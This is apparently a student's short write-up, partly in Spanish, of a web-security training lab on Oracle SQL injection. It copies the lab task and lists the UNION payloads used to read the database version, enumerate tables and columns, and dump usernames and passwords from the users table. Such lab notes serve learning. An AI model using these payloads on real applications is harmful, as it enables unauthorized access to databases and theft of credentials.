@@ -1,0 +1,15 @@
+Lab: SQL injection attack, listing the database contents on Oracle
+
+This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user.
+
+IMG1 Descubrir cols 
+im2 versionado ' UNION SELECT banner,NULL FROM v$version--
+IMG3 ver las tabals 
+' UNION SELECT table_name,NULL FROM all_tables-- 
+Vemos tabal USERS_GLIDVQ 
+IMG4 sacar columnas ' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='USERS_GLIDVQ' --
+img5 SACAR DATOS ' UNION SELECT PASSWORD_QBFBNX, USERNAME_AHRKTS FROM USERS_GLIDVQ--
